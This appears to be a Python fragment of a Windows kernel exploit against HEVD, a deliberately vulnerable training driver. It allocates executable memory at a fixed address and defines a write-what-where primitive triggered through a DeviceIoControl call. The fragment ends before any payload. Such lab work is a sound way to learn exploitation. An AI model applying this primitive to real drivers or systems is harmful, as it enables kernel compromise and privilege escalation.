import ctypes, struct, sys, os, win32con, time, platform
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32
gdi32 = windll.gdi32
user32 = windll.user32 

ntdll.NtAllocateVirtualMemory.argtypes = [c_ulonglong, POINTER(c_ulonglong), c_ulonglong, POINTER(c_ulonglong), c_ulonglong, c_ulonglong]

STATUS_SUCCESS = 0
written = c_size_t()

# Allocate memory to use for the HEVD Leak
baseadd = c_ulonglong(0x000000001a000000) # Easy to recognize arbitrary address
addsize = c_ulonglong(0x3000) # Arbitrary size
dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFFFFFFFFFF, byref(baseadd), 0x0, byref(addsize), (win32con.MEM_COMMIT | win32con.MEM_RESERVE), win32con.PAGE_EXECUTE_READWRITE)
if dwStatus != STATUS_SUCCESS:
	print("Something went wrong while allocating memory","e")
	sys.exit()

def writeQWORD(driver=None, what=None, where=None):
	what_addr = 0x000000001a001000 # Arbitrary offset inside baseadd
  # Write the what value to what_addr
	data = struct.pack("<Q", what)
	dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, what_addr, data, len(data), byref(written))
	if dwStatus == 0:
		print("Something went wrong while writing to memory","e")

		sys.exit()
  
  # Pack the address of the what value and the where address
	data = struct.pack("<Q", what_addr) + struct.pack("<Q", where)
	dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a000000, data, len(data), byref(written))
	if dwStatus == 0:
		print("Something went wrong while writing to memory","e")
		sys.exit()

	IoControlCode = 0x0022200B
	InputBuffer = c_void_p(0x000000001a000000)
	InputBufferLength = 0x10
	OutputBuffer = c_void_p(0x00000001a002000)
	OutputBufferLength = 0x0
	dwBytesReturned = c_ulong()
	lpBytesReturned = byref(dwBytesReturned)

	triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
	return triggerIOCTL
